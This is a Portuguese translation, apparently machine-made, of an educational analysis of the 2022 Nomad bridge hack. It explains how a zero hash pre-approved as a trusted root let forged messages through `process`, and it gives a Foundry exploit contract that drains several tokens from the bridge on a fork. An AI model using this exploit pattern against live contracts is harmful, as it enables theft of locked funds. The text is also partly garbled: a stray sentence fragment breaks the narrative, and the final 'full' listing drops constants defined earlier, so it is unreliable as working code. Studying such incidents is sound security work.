# Depuração de Transações OnChain: 7. Análise do Hack: Nomad Bridge (2022/08)

### Autor: [gmhacker.eth](https://twitter.com/realgmhacker)

## Introdução
A ponte Nomad foi hackeada em 1º de agosto de 2022 e $190 milhões de fundos bloqueados foram drenados. Depois que um atacante conseguiu explorar a vulnerabilidade e obter sucesso, outros viajantes da floresta escura se juntaram para repetir o exploit, o que acabou se tornando um hack colossal "colaborativo".

Uma atualização de rotina na implementação de um dos contratos proxy do Nomad marcou um valor de hash zero como uma raiz confiável, o que permitiu que as mensagens fossem automaticamente comprovadas. O hacker aproveitou essa vulnerabilidade para falsificar o contrato da ponte e enganá-lo para desbloquear fundos.

Apenas essa primeira transação bem-sucedida, que pode ser vista [aqui](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), drenou 100 WBTC da ponte - cerca de $2,3 milhões na época. Não foi necessário um flashloan ou outra interação complexa com outro protocolo DeFi. O ataque simplesmente chamou uma função no contrato com a entrada de mensagem correta, e o atacante continuou atacando a liquidez do protocolo.

Infelizmente, a natureza simples e repetível da transação levou outros a coletar parte do lucro ilícito. Como [Rekt News](https://rekt.news/nomad-rekt/) colocou, "Fiel aos princípios do DeFi, esse hack foi sem permissão - qualquer um poderia participar".

Neste artigo, analisaremos a vulnerabilidade explorada no contrato Replica da ponte Nomad e, em seguida, criaremos nossa própria versão do ataque para drenar toda a liquidez em uma transação, testando-a em um fork local. Você pode verificar o PoC completo [aqui](https://github.com/immunefi-team/hack-analysis-pocs/tree/main/src/nomad-august-2022).

Este artigo foi escrito por [gmhacker.eth](https://twitter.com/realgmhacker), um Triador de Contratos Inteligentes da Immunefi.

## Contexto

O Nomad é um protocolo de comunicação entre cadeias que permite, entre outras coisas, a ponte de tokens entre Ethereum, Moonbeam e outras cadeias. As mensagens enviadas para os contratos Nomad são verificadas e transportadas para outras cadeias por meio de agentes off-chain, seguindo um mecanismo de verificação otimista.

Como a maioria dos protocolos de ponte entre cadeias, a ponte de tokens do Nomad é capaz de transferir valor por meio de diferentes cadeias por meio de um processo de bloqueio de tokens de um lado e emissão de representantes do outro. Como esses tokens representativos podem eventualmente ser queimados para desbloquear os fundos originais (ou seja, retornar à cadeia nativa do token), eles funcionam como IOUs e têm o mesmo valor econômico dos ERC-20 originais. Esse aspecto das pontes em geral leva a uma grande acumulação de fundos dentro de um contrato inteligente complexo, tornando-o um alvo muito desejado para hackers.

<div align=center>
<img src="https://user-images.githubusercontent.com/107821372/217752487-9580592c-98ed-4690-b330-d211d795d276.png" alt="Capa" width="80%"/>
</div>

Processo de bloqueio e emissão, src: [blog da MakerDAO](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

No caso do Nomad, um contrato chamado `Replica`, que é implantado em todas as cadeias suportadas, é responsável por validar mensagens em uma estrutura de árvore de Merkle. Outros contratos no protocolo dependem disso para autenticação de mensagens de entrada. Uma vez que uma mensagem é validada, ela é armazenada na árvore de Merkle, gerando uma nova raiz da árvore comprometida que é confirmada para ser processada.

## Causa Raiz

Tendo uma compreensão geral do que é a ponte Nomad, podemos mergulhar no código real do contrato inteligente para explorar a vulnerabilidade que foi aproveitada nas várias transações do hack de agosto de 2022. Para fazer isso, precisamos nos aprofundar no contrato `Replica`.

```
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven");
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0;
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```
<div align=center>

Trecho 1: função `process` em Replica.sol, veja [raw](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0#file-nomad-hack-analysis-1-sol).

</div>

A função `process` [function](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code%23F1%23L179) no contrato `Replica` é responsável por despachar uma mensagem para seu destinatário final. Isso só será bem-sucedido se a mensagem de entrada já tiver sido comprovada, o que significa que a mensagem já foi adicionada à árvore de Merkle, levando a uma raiz aceita e confiável. Essa verificação é feita em relação ao hash da mensagem, usando a função de visualização `acceptableRoot`, que lerá o mapeamento de raízes confirmadas.

```
   function initialize(
       uint32 _remoteDomain,
       address _updater,
       bytes32 _committedRoot,
       uint256 _optimisticSeconds
   ) public initializer {
       __NomadBase_initialize(_updater);
       // set storage variables
       entered = 1;
       remoteDomain = _remoteDomain;
       committedRoot = _committedRoot;
       // pre-approve the committed root.
       confirmAt[_committedRoot] = 1;
       _setOptimisticTimeout(_optimisticSeconds);
   }
```
<div align=center>

Trecho 2: função `initialize` em Replica.sol, veja [raw](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9#file-nomad-hack-analysis-2-sol).

</div>

Quando ocorre uma atualização na implementação de um determinado contrato proxy, a lógica de atualização pode executar uma função de inicialização de chamada única. Essa função definirá alguns valores de estado iniciais. Em particular, uma atualização de rotina em 21 de abril foi feita e o valor 0x00 foi passado como a raiz comprometida pré-aprovada, que é armazenada no mapeamento confirmAt. Foi aí que a vulnerabilidade apareceu.

Voltando à função `process()`, vemos que dependemos de verificar um hash de mensagem no mapeamento `messages`. Esse mapeamento é responsável por marcar as mensagens como processadas, para que os atacantes não possam repetir a mesma mensagem.

Um aspecto particular do armazenamento de contrato inteligente EVM é que todos os slots são inicializados virtualmente como valores zero, o que significa que se alguém ler um slot não utilizado no armazenamento, não será gerada uma exceção, mas sim retornará 0x00. Um corolário disso é que toda chave não utilizada em um mapeamento Solidity retornará 0x00. Seguindo essa lógica, sempre que o hash da mensagem não estiver presente no mapeamento `messages`, será retornado 0x00, e isso será passado para a função `acceptableRoot`, que por sua vez retornará verdadeiro, dado que 0x00 foi definido como uma raiz confiável. A mensagem será então marcada como processada, mas qualquer pessoa pode simplesmente alterar a mensagem para criar uma nova mensagem não utilizada e enviá-la novamente.

A mensagem de entrada codifica vários parâmetros diferentes em um determinado formato. Entre eles, para uma mensagem desbloquear fundos da ponte, há o endereço do destinatário. Portanto, depois que o primeiro atacante executou uma [transação bem-sucedida](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), qualquer pessoa que soubesse como decodificar o formato da mensagem poderia simplesmente alterar o endereço do destinatário e repetir a transação de ataque, desta vez com uma mensagem diferente que daria lucro para o novo endereço.

## Prova de Conceito

Agora que entendemos a vulnerabilidade que comprometeu o protocolo Nomad, podemos formular nossa própria prova de conceito (PoC). Vamos criar mensagens específicas para chamar a função `process` no contrato `Replica` uma vez para cada token específico que queremos drenar, levando à insolvência do protocolo em uma única transação.

Começaremos selecionando um provedor RPC com acesso a arquivos. Para esta demonstração, usaremos [o agregador RPC público gratuito](https://www.ankr.com/rpc/eth/) fornecido pela Ankr. Selecionamos o número do bloco 15259100 como nosso bloco de fork, 1 bloco antes da primeira transação de hack.

Nossa PoC precisa passar por várias etapas em uma única transação para ter sucesso. Aqui está uma visão geral de alto nível do que implementaremos em nossa PoC de ataque:

1. Selecionar um determinado token ERC-20 e verificar o saldo do contrato de ponte ERC-20 do Nomad.
2. Gerar uma carga útil de mensagem com os parâmetros corretos para desbloquear fundos, entre os quais nosso endereço de atacante como destinatário e o saldo total do token como a quantidade de fundos a serem desbloqueados.
3. Chamar a função vulnerável `process`, o que levará à transferência de tokens para o endereço do destinatário.
4. Percorrer vários tokens ERC-20 com uma presença relevante no saldo da ponte para drenar esses fundos da mesma maneira.

Vamos codificar uma etapa de cada vez e, eventualmente, ver como fica toda a PoC. Usaremos o Foundry.

## O Ataque

```
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```
<div align=center>

Trecho 3: O início do nosso contrato de ataque, veja [raw](https://gist.github.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac#file-nomad-hack-analysis-3-sol).

</div>

Vamos começar criando nosso contrato Attacker. O ponto de entrada para nosso contrato será a função `attack`, que é tão simples quanto um loop for percorrendo vários endereços de token diferentes. Verificamos o saldo de `ERC20_BRIDGE` do token específico com o qual estamos lidando. Este é o endereço do contrato de ponte ERC-20 do Nomad, que detém os fundos bloqueados no Ethereum.

Depois disso, a carga útil maliciosa da mensagem é gerada. Os parâmetros que mudarão em cada iteração do loop são o endereço do token e a quantidade de fundos a serem transferidos. A mensagem gerada será a entrada para a função `IReplica.process`. Como já estabelecemos, essa função encaminhará a mensagem codificada para o contrato final correto no protocolo Nomad para concretizar a solicitação de desbloqueio e transferência, enganando efetivamente a lógica da ponte.

```

contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```
<div align=center>

Trecho 4: Gere a mensagem maliciosa com o formato e parâmetros corretos, veja [raw](https://gist.github.com/gists-immunefi/2a5fbe2e6034dd30534bdd4433b52a29#file-nomad-hack-analysis-4-sol).

</div>

A mensagem gerada precisa ser codificada com vários parâmetros diferentes, para que seja corretamente descompactada pelo protocolo. É importante especificar o caminho de encaminhamento da mensagem - o roteador da ponte e os endereços da ponte ERC-20. Devemos marcar a mensagem como uma transferência de token, daí o valor `0x3` como o tipo.

Por fim, temos que especificar os parâmetros que nos trarão lucro - o endereço correto do token, a quantidade a ser transferida e o destinatário dessa transferência. Como já vimos, isso certamente criará uma nova mensagem original que nunca foi processada pelo contrato `Replica`, o que significa que ela será realmente vista como válida, de acordo com nossa explicação anterior.

ataque. Se tivéssemos alguns logs do Foundry, nossa PoC ainda teria apenas 87 linhas de código.

Se executarmos esta PoC no número do bloco bifurcado, obteremos os seguintes lucros:

* 1.028 WBTC
* 22.876 WETH
* 87.459.362 USDC
* 8.625.217 USDT
* 4.533.633 DAI
* 119.088 FXS
* 113.403.733 CQT

## Conclusão

O exploit da ponte Nomad foi um dos maiores hacks de 2022. O ataque destaca a importância da segurança em todo o protocolo. Neste caso específico, aprendemos como uma única atualização de rotina em uma implementação de proxy pode causar uma vulnerabilidade crítica e comprometer todos os fundos bloqueados. Além disso, durante o desenvolvimento, é necessário ter cuidado com os valores padrão 0x00 nos slots de armazenamento, especialmente na lógica que envolve mapeamentos. Também é bom ter uma configuração de teste de unidade para esses valores comuns que podem levar a vulnerabilidades.

Deve-se observar que algumas contas de saqueadores que drenaram parte dos fundos os devolveram ao protocolo. Há [planos para relançar a ponte](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90), e os ativos devolvidos serão distribuídos aos usuários por meio de ações proporcionais dos fundos recuperados. Quaisquer fundos roubados podem ser devolvidos para a [carteira de recuperação](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154) do Nomad.

Como mencionado anteriormente, esta PoC na verdade aprimora o hack e drena todo o TVL em uma única transação. É um ataque mais simples do que o que realmente aconteceu na realidade. É assim que fica toda a nossa PoC, com a adição de alguns logs úteis do Foundry:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```
<div align=center>

Trecho 5: todo o código, veja [raw](https://gist.github.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff#file-nomad-hack-analysis-5-sol).

</div>
.

<!-- This file was translated using AI by repo_ai_translate. For more information, visit https://github.com/marcelojsilva/repo_ai_translate -->